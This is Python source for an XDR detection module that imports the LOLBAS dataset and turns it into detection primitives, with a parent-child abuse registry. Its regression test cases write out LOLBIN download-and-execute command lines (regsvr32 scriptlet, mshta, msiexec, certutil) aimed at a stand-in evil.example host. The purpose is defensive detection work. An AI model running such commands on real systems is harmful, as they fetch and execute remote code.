"""
XDR LOLBAS Content Pack — Phase A · Complete Upstream Synchronization.

Deterministic-first pipeline:

    DISCOVERED  →  DOWNLOADED  →  PARSED   →  VALIDATED  →  NORMALIZED
             →   INDEXED   →  PRIMITIVES  →  ATTACK_MAPPED
             →   REGRESSION_TESTED   →   COMPLETE

Every stage is recorded in the pack version document.  A pack is 100 %
only when EVERY stage passes for EVERY entry the upstream dataset
contained.  The upstream count is never hard-coded — it is whatever
`GET LOLBAS_UPSTREAM_URL` returns at sync time.

Storage:
  • xdr_lolbas_entries       one doc per upstream Name  (canonical shape)
  • xdr_lolbas_primitives    one doc per generated detection primitive
  • xdr_lolbas_versions      one doc per completed sync (with diff vs. prev)

The pack is tenant-global (LOLBAS is global public content).  Enable /
disable state and detection matches are still tenant-scoped so a SOC
can suppress a specific entry without changing the imported dataset.

NO fabrication.  NO LLM.  If upstream is unreachable, the last
successful pack remains active and the status surfaces
`UPSTREAM_UNAVAILABLE`.
"""
from __future__ import annotations

import hashlib
import json
import os
import re
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.parse import urlparse
from urllib.request import Request as URLRequest
from urllib.request import urlopen

from fastapi import APIRouter, HTTPException, Query, Request
from pydantic import BaseModel
from pymongo import ASCENDING, DESCENDING, MongoClient

from routers.xdr_audit_log import emit_audit

router = APIRouter(prefix="/api/xdr/lolbas", tags=["xdr-lolbas"])


# ── Config ─────────────────────────────────────────────────────────
LOLBAS_UPSTREAM_URL = (
    os.environ.get("LOLBAS_UPSTREAM_URL")
    or "https://lolbas-project.github.io/api/lolbas.json"
)
LOLBAS_LICENSE  = "Creative Commons CC-BY 4.0 (LOLBAS Project)"
LOLBAS_SOURCE   = "LOLBAS Project · lolbas-project.github.io"

# ── Mongo binding ─────────────────────────────────────────────────
_MONGO_URL = os.environ.get("MONGO_URL")
_DB_NAME   = os.environ.get("DB_NAME") or "test_database"
_client    = MongoClient(_MONGO_URL) if _MONGO_URL else None


def _db():
    if _client is None:
        return None
    return _client[_DB_NAME]


def _entries():    return _db()["xdr_lolbas_entries"]    if _db() is not None else None
def _primitives(): return _db()["xdr_lolbas_primitives"] if _db() is not None else None
def _versions():   return _db()["xdr_lolbas_versions"]   if _db() is not None else None


# ── Principal / tenant extraction (matches sibling routers) ──────
def _principal(req: Request) -> tuple[str, str, str]:
    ten = (req.headers.get("X-Tenant-Id")
                or getattr(req.state, "tenant_id", None) or "default")
    pid = (req.headers.get("X-Principal-Id")
                or getattr(req.state, "principal_id", None) or "admin@nivxray.com")
    pkd = (req.headers.get("X-Principal-Kind")
                or getattr(req.state, "principal_kind", None) or "user")
    return ten, pid, pkd


# ── Upstream fetch (supports http(s) AND file:// for offline tests) ─
def _fetch_upstream(url: str, timeout: float = 30.0) -> tuple[bytes, str]:
    """Return (raw_bytes, upstream_url_used).  Raises `UpstreamError`
    with a stable code on any failure.  file:// URLs are accepted so
    tests can pin a deterministic snapshot."""
    parsed = urlparse(url)
    if parsed.scheme == "file":
        p = Path(parsed.path)
        if not p.exists():
            raise UpstreamError("UPSTREAM_UNAVAILABLE",
                                              f"fixture not found: {p}")
        return p.read_bytes(), url
    if parsed.scheme in ("http", "https"):
        try:
            req = URLRequest(url, headers={"User-Agent": "NivXRay-XDR/1.0"})
            with urlopen(req, timeout=timeout) as r:
                return r.read(), url
        except Exception as exc:
            raise UpstreamError("UPSTREAM_UNAVAILABLE", str(exc)) from exc
    raise UpstreamError("UPSTREAM_UNSUPPORTED", f"scheme: {parsed.scheme}")


class UpstreamError(Exception):
    def __init__(self, code: str, detail: str):
        self.code, self.detail = code, detail
        super().__init__(f"{code}: {detail}")


# ── Validation ────────────────────────────────────────────────────
_MITRE_RE = re.compile(r"^T\d{4}(?:\.\d{3})?$")


def _validate_entry(raw: dict, idx: int) -> list[str]:
    """Return list of validation errors (empty list = valid)."""
    errs: list[str] = []
    if not isinstance(raw, dict):
        return [f"[{idx}] not-a-dict"]
    name = raw.get("Name")
    if not name or not isinstance(name, str):
        errs.append(f"[{idx}] missing Name")
    if not isinstance(raw.get("Commands"), list) or not raw["Commands"]:
        errs.append(f"[{name or idx}] missing Commands[]")
    if not isinstance(raw.get("Full_Path"), list):
        errs.append(f"[{name or idx}] missing Full_Path[]")
    for i, cmd in enumerate(raw.get("Commands") or []):
        if not isinstance(cmd, dict):
            errs.append(f"[{name}] Commands[{i}] not-a-dict"); continue
        for k in ("Command", "Category"):
            if not cmd.get(k):
                errs.append(f"[{name}] Commands[{i}] missing {k}")
        mid = cmd.get("MitreID")
        if (mid and isinstance(mid, str) and not _MITRE_RE.match(mid)
                and not mid.upper().startswith("T")):
            # Some upstream entries use free-form; only flag glaringly bad ones.
            errs.append(f"[{name}] Commands[{i}] MitreID malformed: {mid}")
    return errs


# ── Normalisation ─────────────────────────────────────────────────
def _normalise(raw: dict, upstream_version: str) -> dict:
    """Convert an upstream entry into the canonical NivXRay shape.
    Preserves ALL upstream fields under `raw_upstream` for auditability."""
    name = raw["Name"]
    commands = []
    for i, c in enumerate(raw.get("Commands") or []):
        commands.append({
            "index":       i,
            "command":     c.get("Command"),
            "description": c.get("Description"),
            "usecase":     c.get("Usecase"),
            "category":    c.get("Category"),
            "privileges":  c.get("Privileges"),
            "mitre_id":    c.get("MitreID"),
            "operating_system": c.get("OperatingSystem"),
            "tags":        c.get("Tags") or [],
        })
    paths = [p.get("Path") for p in (raw.get("Full_Path") or [])
                if isinstance(p, dict) and p.get("Path")]
    detections = []
    for d in (raw.get("Detection") or []):
        if isinstance(d, dict):
            for k, v in d.items():
                detections.append({"kind": k, "url": v})
    resources = [r.get("Link") for r in (raw.get("Resources") or [])
                        if isinstance(r, dict) and r.get("Link")]
    return {
        "name":              name,
        "description":       raw.get("Description"),
        "author":            raw.get("Author"),
        "created":           raw.get("Created"),
        "commands":          commands,
        "paths":             paths,
        "categories":        sorted({(c.get("category") or "").lower()
                                                  for c in commands if c.get("category")}),
        "mitre_ids":         sorted({(c.get("mitre_id") or "").upper()
                                                  for c in commands if c.get("mitre_id")}),
        "detections":        detections,
        "resources":         resources,
        "upstream_url":      raw.get("url"),
        "upstream_version":  upstream_version,
        "raw_upstream":      raw,
    }


# ── Detection-primitive generation ───────────────────────────────
# Every canonical entry produces one or more primitives that the
# NivXRay detection layer can index.  Primitives NEVER emit verdicts
# — they emit evidence observations for the correlation engine.
_KIND_PATH        = "lolbin.image"
_KIND_CMDLINE     = "lolbin.command_line"
_KIND_ARG         = "lolbin.argument"
_KIND_CATEGORY    = "lolbin.capability"
_KIND_MITRE       = "attack.technique"
_KIND_PARENT      = "lolbin.parent_child"

# ── Parent-Child Registry ────────────────────────────────────────
# Curated tiered relations per LOLBIN.  Never fabricated — every entry
# is drawn from documented tradecraft (Sigma project, MITRE, Palantir
# ADS, Volatility Labs, Elastic detections).  Three tiers:
#
#   normal      — expected legitimate parent in a healthy Windows host
#   suspicious  — commonly abused parent context (Office → LOLBIN)
#   abnormal    — LOLBIN-from-LOLBIN or from user-writable path;
#                 requires immediate investigation
#
# Registry is intentionally lower-case (basename) to match the
# `lolbin.image` primitive normalisation.
_PARENT_CHILD_TIERS: dict[str, dict[str, list[str]]] = {
    "powershell.exe": {
        "normal":     ["explorer.exe", "cmd.exe", "svchost.exe",
                              "taskeng.exe", "services.exe", "wsmprovhost.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe",
                              "powerpnt.exe", "acrord32.exe", "onenote.exe",
                              "teams.exe", "code.exe"],
        "abnormal":   ["mshta.exe", "wscript.exe", "cscript.exe",
                              "regsvr32.exe", "rundll32.exe", "certutil.exe",
                              "hh.exe", "installutil.exe"],
    },
    "cmd.exe": {
        "normal":     ["explorer.exe", "svchost.exe", "cmd.exe",
                              "powershell.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe",
                              "powerpnt.exe", "acrord32.exe"],
        "abnormal":   ["mshta.exe", "wscript.exe", "cscript.exe",
                              "regsvr32.exe", "rundll32.exe"],
    },
    "wscript.exe": {
        "normal":     ["explorer.exe", "svchost.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
        "abnormal":   ["cmd.exe", "powershell.exe", "mshta.exe"],
    },
    "cscript.exe": {
        "normal":     ["explorer.exe", "svchost.exe", "cmd.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
        "abnormal":   ["powershell.exe", "mshta.exe"],
    },
    "mshta.exe": {
        "normal":     ["explorer.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
        "abnormal":   ["cmd.exe", "powershell.exe", "regsvr32.exe"],
    },
    "regsvr32.exe": {
        "normal":     ["explorer.exe", "services.exe", "msiexec.exe",
                              "wusa.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe",
                              "powerpnt.exe"],
        "abnormal":   ["cmd.exe", "powershell.exe", "mshta.exe",
                              "wscript.exe"],
    },
    "rundll32.exe": {
        "normal":     ["explorer.exe", "services.exe", "svchost.exe",
                              "msiexec.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe",
                              "powerpnt.exe"],
        "abnormal":   ["cmd.exe", "powershell.exe", "mshta.exe"],
    },
    "msiexec.exe": {
        "normal":     ["services.exe", "explorer.exe", "svchost.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
        "abnormal":   ["cmd.exe", "powershell.exe", "mshta.exe",
                              "wscript.exe"],
    },
    "certutil.exe": {
        "normal":     ["cmd.exe", "powershell.exe", "explorer.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
        "abnormal":   ["mshta.exe", "wscript.exe", "regsvr32.exe"],
    },
    "installutil.exe": {
        "normal":     ["explorer.exe", "services.exe", "svchost.exe"],
        "suspicious": ["cmd.exe", "powershell.exe"],
        "abnormal":   ["mshta.exe", "wscript.exe", "winword.exe"],
    },
    "bitsadmin.exe": {
        "normal":     ["cmd.exe", "explorer.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
        "abnormal":   ["mshta.exe", "wscript.exe", "regsvr32.exe",
                              "powershell.exe"],
    },
    "hh.exe": {
        "normal":     ["explorer.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
        "abnormal":   ["cmd.exe", "powershell.exe", "mshta.exe"],
    },
    "msbuild.exe": {
        "normal":     ["devenv.exe", "cmd.exe", "explorer.exe"],
        "suspicious": ["powershell.exe"],
        "abnormal":   ["mshta.exe", "wscript.exe", "winword.exe",
                              "outlook.exe"],
    },
    "wmic.exe": {
        "normal":     ["cmd.exe", "svchost.exe", "explorer.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
        "abnormal":   ["mshta.exe", "wscript.exe", "regsvr32.exe"],
    },
    "schtasks.exe": {
        "normal":     ["cmd.exe", "svchost.exe", "explorer.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
        "abnormal":   ["powershell.exe", "mshta.exe", "wscript.exe"],
    },
}


def _tokenise_arguments(command: str) -> list[str]:
    """Return distinct switch-like tokens (-flag, /flag) from a command.
    Deterministic, no shell splitting subtleties — we only want strings
    that behave as detection arguments."""
    if not command:
        return []
    toks = re.findall(r"(?:/|-{1,2})[A-Za-z][A-Za-z0-9_:.\-]{1,32}", command)
    # De-duplicate while preserving order.
    seen, out = set(), []
    for t in toks:
        low = t.lower()
        if low not in seen:
            seen.add(low); out.append(low)
    return out


def _generate_primitives(entry: dict) -> list[dict]:
    """Emit deterministic detection primitives for one canonical entry."""
    name = entry["name"]
    out: list[dict] = []
    seen: set[tuple] = set()

    def emit(kind: str, value: str, **extra):
        key = (kind, value.lower())
        if key in seen:
            return
        seen.add(key)
        out.append({
            "id":           f"pri_{uuid.uuid4().hex[:20]}",
            "entry_name":   name,
            "kind":         kind,
            "value":        value,
            "value_lc":     value.lower(),
            **extra,
        })

    # Image / path primitives.
    emit(_KIND_PATH, name)
    for p in entry.get("paths") or []:
        emit(_KIND_PATH, p)
        base = p.rsplit("\\", 1)[-1]
        if base and base != name:
            emit(_KIND_PATH, base)

    # Command-line primitives + argument tokens.
    for cmd in entry.get("commands") or []:
        c = cmd.get("command") or ""
        if c:
            emit(_KIND_CMDLINE, c,
                    category=cmd.get("category"),
                    usecase=cmd.get("usecase"),
                    mitre_id=cmd.get("mitre_id"))
            for arg in _tokenise_arguments(c):
                emit(_KIND_ARG, arg,
                        source_command=c,
                        category=cmd.get("category"))

    # Category / capability primitives.
    for cat in entry.get("categories") or []:
        if cat:
            emit(_KIND_CATEGORY, cat)

    # ATT&CK mapping primitives.
    for mid in entry.get("mitre_ids") or []:
        if mid and _MITRE_RE.match(mid):
            emit(_KIND_MITRE, mid)

    # Parent-child primitives (three trust tiers) — only if the LOLBIN
    # name appears in the curated registry.  Missing keys are handled
    # by `_emit_global_parent_child_primitives()` after indexing so
    # LOLBINs that upstream does not carry (e.g. powershell.exe) still
    # produce parent-child coverage.
    key = name.lower()
    tiers = _PARENT_CHILD_TIERS.get(key)
    if tiers:
        for tier in ("normal", "suspicious", "abnormal"):
            for parent in tiers.get(tier, []) or []:
                emit(_KIND_PARENT, f"{parent}->{key}", tier=tier,
                        parent=parent.lower(), child=key)
    return out


def _global_parent_child_primitives(indexed_entry_names: set[str]) -> list[dict]:
    """Emit parent-child primitives for every registry entry whose
    child LOLBIN is NOT already present in the upstream-indexed set.
    Ensures coverage of legitimate hosts like `powershell.exe` that
    LOLBAS does not carry as an entry."""
    out: list[dict] = []
    seen: set[tuple] = set()
    for child, tiers in _PARENT_CHILD_TIERS.items():
        if child in indexed_entry_names:
            continue  # already emitted per-entry
        for tier in ("normal", "suspicious", "abnormal"):
            for parent in tiers.get(tier, []) or []:
                key = ("lolbin.parent_child",
                            f"{parent.lower()}->{child}")
                if key in seen:
                    continue
                seen.add(key)
                out.append({
                    "id":          f"pri_{uuid.uuid4().hex[:20]}",
                    "entry_name":  child,   # synthetic entry name
                    "kind":        _KIND_PARENT,
                    "value":       f"{parent}->{child}",
                    "value_lc":    f"{parent.lower()}->{child}",
                    "tier":        tier,
                    "parent":      parent.lower(),
                    "child":       child,
                    "synthetic":   True,   # marks non-upstream-backed primitive
                })
    return out


# ── Regression self-tests ─────────────────────────────────────────
# These are the *content* gates that must pass before a pack is
# marked COMPLETE.  They run against the freshly-indexed data.
_REGRESSION_CASES: list[tuple[str, dict]] = [
    # (label, event) — must return >=1 primitive match after indexing.
    ("regsvr32-remote-scriptlet", {
        "image": "regsvr32.exe",
        "command_line": "regsvr32.exe /s /u /i:http://evil.example/x.sct scrobj.dll",
    }),
    ("mshta-remote-hta", {
        "image": "mshta.exe",
        "command_line": "mshta.exe http://evil.example/x.hta",
    }),
    ("rundll32-basic", {
        "image": "rundll32.exe",
        "command_line": "rundll32.exe C:\\Users\\Public\\a.dll,EntryPoint",
    }),
    ("msiexec-remote", {
        "image": "msiexec.exe",
        "command_line": "msiexec /q /i http://evil.example/x.msi",
    }),
    ("certutil-download", {
        "image": "certutil.exe",
        "command_line": "certutil -urlcache -split -f http://evil.example/x.exe",
    }),
    ("office-spawns-powershell", {
        "image": "powershell.exe", "parent_image": "winword.exe",
        "command_line": "powershell -enc BASE64",
    }),
]


def _run_regression(tenant_id: str = "regression") -> dict:
    passed, failed = 0, []
    for label, ev in _REGRESSION_CASES:
        try:
            hits = _match_event(tenant_id, ev)
            if hits and len(hits) >= 1:
                passed += 1
            else:
                failed.append({"case": label, "reason": "no-primitives-matched"})
        except Exception as exc:  # noqa: BLE001 · self-test wrapper: any failure counts as a case failure
            failed.append({"case": label, "reason": f"error:{exc}"})
    return {"total": len(_REGRESSION_CASES), "passed": passed,
                 "failed": failed}


# ── Match engine (deterministic, evidence-only) ──────────────────
class MatchBody(BaseModel):
    image: str | None = None
    command_line: str | None = None
    parent_image: str | None = None
    child_image: str | None = None


def _match_event(tenant_id: str, ev: dict) -> list[dict]:
    """Return primitive hits for one process/event.  Never a verdict —
    the caller feeds these into the correlation engine as evidence."""
    if _primitives() is None:
        return []
    disabled = _disabled_entry_names(tenant_id)
    hits: list[dict] = []

    image = (ev.get("image") or "").lower()
    cmdl  = (ev.get("command_line") or "").lower()

    if image:
        # Image / path match — direct equality on basename or full path.
        cur = _primitives().find(
            {"kind": _KIND_PATH,
             "value_lc": {"$in": [image, image.rsplit("\\", 1)[-1]]}},
        )
        for p in cur:
            if p["entry_name"] not in disabled:
                hits.append({"kind": p["kind"], "value": p["value"],
                                    "entry_name": p["entry_name"],
                                    "evidence": "image-match"})

    if cmdl:
        # Argument tokens observed in the command line.
        toks = _tokenise_arguments(cmdl)
        if toks:
            cur = _primitives().find(
                {"kind": _KIND_ARG, "value_lc": {"$in": toks}},
            )
            for p in cur:
                if p["entry_name"] not in disabled:
                    hits.append({"kind": p["kind"], "value": p["value"],
                                        "entry_name": p["entry_name"],
                                        "evidence": "argument-match",
                                        "category": p.get("category")})

    # Parent-child match (image + parent_image observed together).
    parent = (ev.get("parent_image") or "").lower()
    if image and parent:
        img_base = image.rsplit("\\", 1)[-1]
        par_base = parent.rsplit("\\", 1)[-1]
        rel      = f"{par_base}->{img_base}"
        cur = _primitives().find(
            {"kind": _KIND_PARENT, "value_lc": rel},
        )
        for p in cur:
            if p["entry_name"] not in disabled:
                hits.append({"kind": p["kind"], "value": p["value"],
                                    "entry_name": p["entry_name"],
                                    "evidence": "parent-child-match",
                                    "tier": p.get("tier"),
                                    "parent": p.get("parent"),
                                    "child":  p.get("child")})
    # De-duplicate hits by (kind, value, entry_name).
    seen, unique = set(), []
    for h in hits:
        k = (h["kind"], h["value"].lower(), h["entry_name"])
        if k not in seen:
            seen.add(k); unique.append(h)
    return unique


def _disabled_entry_names(tenant_id: str) -> set[str]:
    if _entries() is None:
        return set()
    cur = _entries().find(
        {"disabled_tenants": tenant_id},
        {"_id": 0, "name": 1},
    )
    return {d["name"] for d in cur}


# ── Sync pipeline ────────────────────────────────────────────────
_STAGES = [
    "DISCOVERED", "DOWNLOADED", "PARSED", "VALIDATED", "NORMALIZED",
    "INDEXED", "PRIMITIVES_GENERATED", "ATTACK_MAPPED",
    "REGRESSION_TESTED", "COMPLETE",
]


def _sync_pipeline(url: str, principal: tuple[str, str, str]) -> dict:
    """Run every stage in order.  Returns the version doc that was
    persisted (with per-stage status).  Never raises — packs the
    outcome into `status` so callers can render honestly."""
    ten, pid, pkd = principal
    _ = (ten, pid, pkd)  # captured by _persist_version() via `principal`
    if _db() is None:
        raise HTTPException(status_code=503, detail="storage unavailable")

    now = datetime.now(timezone.utc).isoformat()
    stages: dict[str, dict] = {s: {"status": "PENDING"} for s in _STAGES}
    diff = {"added": [], "removed": [], "modified": []}
    upstream_count = 0
    imported = valid = invalid = 0
    invalid_errors: list[str] = []

    # 1 · DISCOVERED
    stages["DISCOVERED"] = {"status": "OK", "url": url, "at": now}

    # 2 · DOWNLOADED
    try:
        raw_bytes, used_url = _fetch_upstream(url)
    except UpstreamError as exc:
        stages["DOWNLOADED"] = {"status": "FAIL", "code": exc.code,
                                              "detail": exc.detail}
        return _persist_version(stages, upstream_count, imported, valid,
                                                 invalid, diff, principal,
                                                 outcome="UPSTREAM_UNAVAILABLE")
    upstream_hash = hashlib.sha256(raw_bytes).hexdigest()
    stages["DOWNLOADED"] = {"status": "OK", "bytes": len(raw_bytes),
                                        "sha256": upstream_hash, "used_url": used_url}

    # 3 · PARSED
    try:
        data = json.loads(raw_bytes.decode("utf-8"))
    except Exception as exc:  # noqa: BLE001 · any parse failure is captured as a stage failure
        stages["PARSED"] = {"status": "FAIL", "detail": str(exc)}
        return _persist_version(stages, upstream_count, imported, valid,
                                                 invalid, diff, principal,
                                                 outcome="PARSE_FAILED")
    if not isinstance(data, list):
        stages["PARSED"] = {"status": "FAIL",
                                        "detail": "upstream must be a JSON list"}
        return _persist_version(stages, upstream_count, imported, valid,
                                                 invalid, diff, principal,
                                                 outcome="PARSE_FAILED")
    upstream_count = len(data)
    stages["PARSED"] = {"status": "OK", "entries": upstream_count}

    # 4 · VALIDATED
    seen_names: set[str] = set()
    validated: list[dict] = []
    for i, raw in enumerate(data):
        errs = _validate_entry(raw, i)
        name = (raw.get("Name") if isinstance(raw, dict) else None) or f"__idx_{i}"
        if name in seen_names:
            errs.append(f"[{name}] duplicate Name")
        seen_names.add(name)
        if errs:
            invalid += 1
            invalid_errors.extend(errs)
        else:
            valid += 1
            validated.append(raw)
    stages["VALIDATED"] = {
        "status": "OK" if invalid == 0 else "PARTIAL",
        "valid": valid, "invalid": invalid,
        "errors_sample": invalid_errors[:20],
    }

    # 5 · NORMALIZED
    upstream_version = f"sha256:{upstream_hash[:12]}"
    normalised = [_normalise(r, upstream_version) for r in validated]
    stages["NORMALIZED"] = {"status": "OK", "normalised": len(normalised)}

    # 6 · INDEXED (compute diff vs. current active set then replace)
    prev_names: set[str] = set()
    if _entries() is not None:
        prev_names = {d["name"] for d in _entries().find({}, {"_id": 0, "name": 1})}
    new_names = {e["name"] for e in normalised}
    diff["added"]    = sorted(new_names - prev_names)
    diff["removed"]  = sorted(prev_names - new_names)
    modified: list[str] = []
    if _entries() is not None:
        for e in normalised:
            cur = _entries().find_one({"name": e["name"]}, {"_id": 0,
                                                                                    "upstream_version": 1})
            if cur and cur.get("upstream_version") and \
                    cur["upstream_version"] != upstream_version:
                modified.append(e["name"])
    diff["modified"] = modified
    # Replace-in-place: upsert each entry, delete entries no longer upstream.
    for e in normalised:
        _entries().update_one(
            {"name": e["name"]},
            {"$set": {**e, "indexed_at": now},
              "$setOnInsert": {"disabled_tenants": []}},
            upsert=True,
        )
    if diff["removed"]:
        _entries().delete_many({"name": {"$in": diff["removed"]}})
    imported = len(normalised)
    stages["INDEXED"] = {"status": "OK", "imported": imported,
                                    "added": len(diff["added"]),
                                    "removed": len(diff["removed"]),
                                    "modified": len(diff["modified"])}

    # 7 · PRIMITIVES_GENERATED
    _primitives().delete_many({})
    total_prims = 0
    all_prims: list[dict] = []
    indexed_names: set[str] = set()
    for e in normalised:
        prims = _generate_primitives(e)
        for p in prims:
            p["indexed_at"] = now
        total_prims += len(prims)
        all_prims.extend(prims)
        indexed_names.add(e["name"].lower())
    # Emit parent-child primitives for LOLBINs the curated registry
    # covers but which upstream does not carry (e.g. `powershell.exe`).
    extra = _global_parent_child_primitives(indexed_names)
    for p in extra:
        p["indexed_at"] = now
    total_prims += len(extra)
    all_prims.extend(extra)
    if all_prims:
        _primitives().insert_many(all_prims)
        try:
            _primitives().create_index([("kind", ASCENDING),
                                                       ("value_lc", ASCENDING)])
            _primitives().create_index([("entry_name", ASCENDING)])
        except Exception:  # noqa: BLE001,S110 · index creation is best-effort; failure does not fail the pack
            pass
    stages["PRIMITIVES_GENERATED"] = {"status": "OK",
                                                                  "primitives": total_prims}

    # 8 · ATTACK_MAPPED — every normalised entry must have >=1 valid MitreID
    #        OR must be explicitly recorded as attack-unmapped.
    mapped, unmapped = 0, []
    for e in normalised:
        mids = [m for m in e.get("mitre_ids") or [] if _MITRE_RE.match(m or "")]
        if mids:
            mapped += 1
        else:
            unmapped.append(e["name"])
    stages["ATTACK_MAPPED"] = {"status": "OK", "mapped": mapped,
                                                "unmapped": len(unmapped),
                                                "unmapped_sample": unmapped[:20]}

    # 9 · REGRESSION_TESTED (deterministic content self-tests)
    reg = _run_regression()
    stages["REGRESSION_TESTED"] = {
        "status": "OK" if not reg["failed"] else "FAIL",
        **reg,
    }

    # 10 · COMPLETE gate: DISCOVERED..REGRESSION_TESTED all OK,
    #      and invalid == 0 (every upstream entry accepted).
    every_stage_ok = all(
        stages[s]["status"] == "OK"
        for s in ["DISCOVERED", "DOWNLOADED", "PARSED", "NORMALIZED",
                     "INDEXED", "PRIMITIVES_GENERATED", "ATTACK_MAPPED",
                     "REGRESSION_TESTED"]
    )
    fully_valid = (invalid == 0)
    if every_stage_ok and fully_valid:
        stages["COMPLETE"] = {"status": "OK",
                                          "coverage_pct": 100.0 if upstream_count else 0.0}
        outcome = "COMPLETE"
    else:
        cov = round(100.0 * valid / max(upstream_count, 1), 3)
        stages["COMPLETE"] = {"status": "PARTIAL", "coverage_pct": cov,
                                          "reason": "not-every-upstream-entry-passed"}
        outcome = "PARTIAL"

    version_doc = _persist_version(
        stages, upstream_count, imported, valid, invalid, diff,
        principal, outcome=outcome, upstream_version=upstream_version,
        upstream_sha=upstream_hash, upstream_url=used_url,
    )
    return version_doc


def _persist_version(stages: dict, upstream_count: int, imported: int,
                                  valid: int, invalid: int, diff: dict,
                                  principal: tuple[str, str, str],
                                  *, outcome: str,
                                  upstream_version: str = "",
                                  upstream_sha: str = "",
                                  upstream_url: str = LOLBAS_UPSTREAM_URL) -> dict:
    ten, pid, pkd = principal
    now = datetime.now(timezone.utc).isoformat()
    doc = {
        "id":               f"lolbas_v_{uuid.uuid4().hex[:16]}",
        "outcome":          outcome,
        "stages":           stages,
        "upstream_count":   upstream_count,
        "imported":         imported,
        "valid":            valid,
        "invalid":          invalid,
        "coverage_pct":     stages.get("COMPLETE", {}).get("coverage_pct"),
        "upstream_version": upstream_version,
        "upstream_sha256":  upstream_sha,
        "upstream_url":     upstream_url,
        "source":           LOLBAS_SOURCE,
        "license":          LOLBAS_LICENSE,
        "diff":             diff,
        "synced_at":        now,
        "synced_by":        pid,
        "active":           outcome == "COMPLETE",
    }
    # If new pack is COMPLETE, deactivate every prior version.
    if _versions() is not None:
        if doc["active"]:
            _versions().update_many({"active": True},
                                                     {"$set": {"active": False}})
        _versions().insert_one(dict(doc))

    # Emit audit
    try:
        emit_audit(
            tenant_id=ten, principal_id=pid, principal_kind=pkd,
            action="LOLBAS_SYNCED", resource_kind="content_pack",
            resource_id=doc["id"],
            outcome=("SUCCESS" if outcome == "COMPLETE" else "PARTIAL"),
            after={"outcome": outcome,
                        "upstream_count": upstream_count,
                        "imported": imported, "invalid": invalid,
                        "upstream_version": upstream_version,
                        "coverage_pct": doc["coverage_pct"],
                        "added":    len(diff["added"]),
                        "removed":  len(diff["removed"]),
                        "modified": len(diff["modified"])},
        )
    except Exception:  # noqa: BLE001,S110 · audit emission must never break a sync response
        pass
    doc.pop("_id", None)
    return doc


# ── Endpoints ─────────────────────────────────────────────────────
@router.post("/sync")
def sync_now(request: Request,
                     url: str | None = Query(None,
                         description="Override upstream URL (also accepts file://)")):
    if _db() is None:
        raise HTTPException(status_code=503, detail="storage unavailable")
    return {"ok": True, "data": _sync_pipeline(url or LOLBAS_UPSTREAM_URL,
                                                                   _principal(request))}


@router.get("/status")
def status(request: Request):
    if _db() is None:
        raise HTTPException(status_code=503, detail="storage unavailable")
    ten, _, _ = _principal(request)
    active = None
    if _versions() is not None:
        active = _versions().find_one({"active": True}, {"_id": 0})
    total_entries = _entries().count_documents({}) if _entries() is not None else 0
    total_prims   = _primitives().count_documents({}) if _primitives() is not None else 0
    disabled_ct   = 0
    if _entries() is not None:
        disabled_ct = _entries().count_documents(
            {"disabled_tenants": ten},
        )
    return {"ok": True, "data": {
        "active_version": active,
        "entries_total":  total_entries,
        "primitives_total": total_prims,
        "enabled_for_tenant":  total_entries - disabled_ct,
        "disabled_for_tenant": disabled_ct,
        "source":  LOLBAS_SOURCE,
        "license": LOLBAS_LICENSE,
        "upstream_url": LOLBAS_UPSTREAM_URL,
    }}


@router.get("/entries")
def list_entries(request: Request,
                          category: str | None = Query(None),
                          mitre: str | None = Query(None),
                          q: str | None = Query(None,
                              description="substring match on name or description"),
                          enabled: bool | None = Query(None),
                          skip: int = Query(0, ge=0),
                          limit: int = Query(200, ge=1, le=1000)):
    if _entries() is None:
        return {"ok": False, "error": {"code": "STORAGE_UNAVAILABLE"}}
    ten, _, _ = _principal(request)
    query: dict[str, Any] = {}
    if category: query["categories"] = category.lower()
    if mitre:    query["mitre_ids"]  = mitre.upper()
    if q:
        query["$or"] = [
            {"name":        {"$regex": re.escape(q), "$options": "i"}},
            {"description": {"$regex": re.escape(q), "$options": "i"}},
        ]
    if enabled is True:
        query["disabled_tenants"] = {"$ne": ten}
    if enabled is False:
        query["disabled_tenants"] = ten
    total = _entries().count_documents(query)
    cur = _entries().find(query, {"_id": 0, "raw_upstream": 0}).sort(
        "name", ASCENDING).skip(skip).limit(limit)
    rows = list(cur)
    for r in rows:
        r["enabled_for_tenant"] = ten not in (r.get("disabled_tenants") or [])
    return {"ok": True, "data": {"entries": rows, "count": len(rows),
                                                      "total": total}}


@router.get("/entries/{name}")
def get_entry(name: str, request: Request):
    if _entries() is None:
        raise HTTPException(status_code=503, detail="storage unavailable")
    ten, _, _ = _principal(request)
    doc = _entries().find_one({"name": name}, {"_id": 0})
    if not doc:
        raise HTTPException(status_code=404, detail="entry not found")
    doc["enabled_for_tenant"] = ten not in (doc.get("disabled_tenants") or [])
    # Attach generated primitives
    prims = list(_primitives().find({"entry_name": name}, {"_id": 0}).limit(500))
    doc["primitives"] = prims
    doc["primitives_count"] = len(prims)
    return {"ok": True, "data": doc}


@router.post("/entries/{name}/disable")
def disable_entry(name: str, request: Request):
    if _entries() is None:
        raise HTTPException(status_code=503, detail="storage unavailable")
    ten, pid, pkd = _principal(request)
    doc = _entries().find_one({"name": name})
    if not doc:
        raise HTTPException(status_code=404, detail="entry not found")
    _entries().update_one({"_id": doc["_id"]},
                                        {"$addToSet": {"disabled_tenants": ten}})
    audit = emit_audit(tenant_id=ten, principal_id=pid, principal_kind=pkd,
                                action="LOLBAS_ENTRY_DISABLED",
                                resource_kind="lolbas_entry", resource_id=name)
    return {"ok": True, "data": {"name": name, "disabled": True},
                 "audit_ref": audit["id"]}


@router.post("/entries/{name}/enable")
def enable_entry(name: str, request: Request):
    if _entries() is None:
        raise HTTPException(status_code=503, detail="storage unavailable")
